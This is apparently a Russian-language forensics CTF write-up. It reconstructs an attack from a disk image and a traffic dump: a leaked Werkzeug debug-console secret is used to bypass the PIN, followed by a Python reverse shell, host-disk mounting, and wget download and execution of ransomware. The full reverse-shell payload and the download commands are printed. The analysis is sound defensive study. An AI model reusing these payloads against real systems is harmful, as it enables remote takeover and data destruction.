# Начало

## Изучение диска

Сначала я увидел `image.img` и `dump.pcapng` (на кали).

Сразу я решил открыть `image.img` через `testdisk` и скопировал себе в папку `image/` некоторые директории из корня:
`bin.usr-is-merged/`, `home/`, `media/`, `opt/`, `root/`, `tmp/`, `etc/`, `lib.usr-is-merged`, `mnt/`, `proc/`, `sbin.usr-is-merged`, `var/`

Сразу обратил внимание, что в `opt/` есть Addition для VirtualBox (эта информация не пригодилась)

Далее я обратил внимание на содержимое `/home/ioal/`. Там была папка `app/`, внутри которой вроде было приложение в докере, но все файлы оканчивались на `.enc` и внутри ничего не было понятно

## Запуск системы

После этого я решил запустить эту систему через

```
qemu-system-x86_64 \
 -m 4096 \
 -drive format=raw,file=image.img \
 -cpu host \
 -smp 6 \
 -machine type=q35,accel=kvm
```

Внутри была Ubuntu 24.04.1 LTS (Noble Numbat) и единственный аккаунт `ioal`

## Попытка входа

Пароль от него я не знал, поэтому решил скопировать себе `/etc/password` и `/etc/shadow`

Я прописал `fdisk --list image.img` и узнал оффсет раздела с убунтой - `4096` (`4096 * 512 = 2097152`)

Далее я создал папку `/mnt/tmp` (на кали) и прописал `sudo losetup --offset 2097152 /dev/loop667 image.img` и `sudo mount /dev/loop667 /mnt/tmp`

Таким образом я скопировал себе `/etc/password` и `/etc/shadow` и попытался узнать пароль от `ioal` с помощью `john`, но, к сожалению, не вышло

Тогда я просто решил `sudo chroot /mnt/tmp/` и через `useradd qwerty`, `passwd qwerty` создал себе пользователя, которому через `usermod qwerty -aG sudo` выдал доступ к `sudo` (я потом еще пожалел о том, что сразу не создал `/home/qwerty`, потому что файловый менеджер уничтожил мне виртуалку сообщениями об ошибке)

Я заметил, что хост называется `fileshare`, а так же его айпи:
- enp0s2: `10.0.2.15/24` (DNS `10.0.2.3`)
- br-4d2c7d1f6f87: `172.18.0.1/16`
- docker0: `172.17.0.1/16`

В `/root/.bash_history` я обнаружил следы, вероятно, организаторов:
```
cd nto-forensics/
ls
cp -r project /home/ioal/app
cd /home/ioal
ls
cd app
ls
cd ../
chown -h
chown --help
chown -hR ioal ./app
ls -al
exit
cd nto-forensics/
ls
ls -al
cd ../
```

И заметил, что в `/home/ioal/` нет никаких файлов

## Создание лога журнала

Дальше я сделал себе свой `system.log` при помощи `sudo journalctl --no-tail > /home/qwerty/main.log`, после чего срезал его до `/home/qwerty/prev.log` (без запуска 26 марта и позже, т.е. только 16 января и 22 января)

Я очень долго копался в логах журанала, но ничего толкового так и не нашел (нашел пару выключений при помощи кнопки выключения, несколько резких выключений, действия AppArmor'а (обычно над фаерфоксом) и всякое другое)

# Продолжение

После всего этого я устал и решил наконец открыть `dump.pcapng` (на кали)

Сначала я вслучайную нажимал на пакеты и в какой-то момент обнаружил в TCP DATA строку
```
root@7a5a67189bc9:/app#
```

И понял, что надо просто просмотреть все пакеты и оценить находки

## Действия в дампе трафика

Последовательно переключая пакеты я понял, что:

Все проделки идут от `10.10.0.12` через `10.10.10.3` (просто ретрансляция) на `172.18.0.3`

Как помнится по айпи на хосте, `172.18.0.0` - это мост докера (значит `172.18.0.3` - это сам сервис)

В докере был запущен python сервис, у которого был путь /console, доступ к которой получил злоумышлиник (`10.10.10.12` через `10.10.10.3`) и нашел там "SECRET"="yqqPfQiFZmXsmnZQYMPF" в разделе <script> в теле HTML

Далее злоумышлиник подобрал url так, что смог обойти пин-код при помощи этого secret'а
```
GET /console?__debugger__=yes&cmd=pinauth&pin=123-456-789&s=yqqPfQiFZmXsmnZQYMPF
```
и получил доступ к python консоли, в которую вписал реверс-шелл
```
/console?&__debugger__=yes&cmd=import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.10.12%22%2C9001))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22bash%22)&frm=0&s=yqqPfQiFZmXsmnZQYMPF
```
Команда реверс-шелла:
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.12",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("bash")
```

И, получил доступ к `root` в докере при помощи `ls /dev`, 'mount /dev/sda2 /mnt`, `cd /mnt/home`

Потом прописал эти команды:
```
cd ioal
rm .*
cd ../
cd ioal
wget http://81.177.221.242:8125/app
```
`wget` пожаловался на то, что директория `app` уже есть (в ней был сервис-докер)
```
ls
cd ../
wget http://81.177.221.242:8125/app
./app
chmod +x app
./app
exit
```
При запуске этот `app` несколько раз написал
```
CUSTOM_write found, patched.
ok
```
И затем
```
Encrypting .//app: Encrypting .//ioal/app/docker-compose.yml: Encrypting .//ioal/app/server/requirements.txt: Encrypting .//ioal/app/server/wait-for-postgres.sh: Encrypting .//ioal/app/server/Dockerfile: Encrypting .//ioal/app/server/templates/index.html: Encrypting .//ioal/app/server/__init__.py: Encrypting .//ioal/app/server/assets/css/listr.pack.css: Encrypting .//ioal/app/server/assets/css/custom.css: Encrypting .//ioal/app/server/assets/css/jquery.filer.css: Encrypting .//ioal/app/server/assets/fonts/fontawesome-webfont.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.ttf: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer-preview.html: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.svg: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.eot: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.cs
```

С помощью этих команд он удалил все файлы в домашней директории `ioal`, после чего поднялся в `/home` и запустил шифровальщик

# Решение задач

Я просто начал выписывать соответствующие пакеты + их содержимое и их номер + время

Когда я дошел до `app` я решил погуглить `"CUSTOM_write found"` и нашел единственную ссылку на проект на гитхабе ([linux-anti-debugging](https://github.com/tobyxdd/linux-anti-debugging/)), который использовал `ptrace` для обфускации

## Задание 2-6

Как настало время решать 2-6 я проконсультировался с `gemini-2.5-pro-exp-03-25` и мне было предложено использовать `hexdump`, где я и увидел сигнатуру `beef dead bade c0fe` во всех зашифрованных файлах
